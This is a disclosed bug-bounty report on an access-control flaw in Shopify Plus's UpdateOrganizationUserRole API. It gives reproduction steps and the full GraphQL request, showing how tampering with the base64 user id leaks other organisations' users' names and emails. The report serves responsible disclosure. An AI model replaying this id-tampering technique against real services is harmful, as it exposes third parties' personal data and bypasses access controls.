# [h1-2102] Improper Access Control at https://shopify.plus/[id]/users/api in operation UpdateOrganizationUserRole

## Report Details
- **Report ID**: 1084638
- **URL**: https://hackerone.com/reports/1084638
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-22T16:01:56.652Z
- **Disclosed**: 2022-04-21T19:06:02.105Z

## Reporter
- **Username**: ramsexy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:
There is an access control issue that happens when a Shopify Plus admin tries to assign a role to a user in another organisation. While the response shows an error message, an email is sent to the shop admin with the first name, last name and email address of the user.

## Steps To Reproduce:
1. Log in to your Shopify Plus account https://shopify.plus/login
2. Go to `Administration` -> `Users` -> `Roles` -> `Create role` then proceed to create a role
3. Go to `Administration` -> `Users` -> `All users` -> `Add users` then proceed to create a user
4. In `Administration` -> `Users` -> `All users`, click on the new user to go to the user page (ie. https://shopify.plus/34808573/users/34057938)
6. In `Access and permissions`, in the `Role` section, click on `Change access` then `Change role`

    {F1168058} 

7. Change the role, and notice the following HTTP request :

    ```http
POST /34808573/users/api HTTP/1.1
Host: shopify.plus
[...]

    {"operationName":"UpdateOrganizationUserRole","variables":{"id":"Z2lkOi8vb3JnYW5pemF0aW9uL09yZ2FuaXphdGlvblVzZXIvMzQwNzE2MzI=","roleId":"Z2lkOi8vb3JnYW5pemF0aW9uL1JvbGUvNjYxAAA="},"query":"mutation UpdateOrganizationUserRole($id: OrganizationUserID!, $roleId: RoleID!) {\n  updateOrganizationUserRole(id: $id, roleId: $roleId) {\n    organizationUser {\n      id\n      status\n      role {\n        id\n        name\n        __typename\n      }\n      propertyAccess {\n        shops {\n          edges {\n            node {\n              shopUserId\n              status\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        apps {\n          edges {\n            node {\n              status\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    message\n    operationStatus\n    __typename\n  }\n}\n"}
```
8. Base64-decode the `id` value and change the user to `34071632` then send the request again
9. The request will fail, but you should receive an email containing Anatoly information (first name, last name and email address).
    {F1168063}

## Impact

A Shopify Plus admin can retrieve PII from another user outside his organisation (first name, last name and email address).

## Attachments
- Screen_Shot_2021-01-22_at_10.48.38_AM.png
- Screen_Shot_2021-01-22_at_10.12.10_AM.png
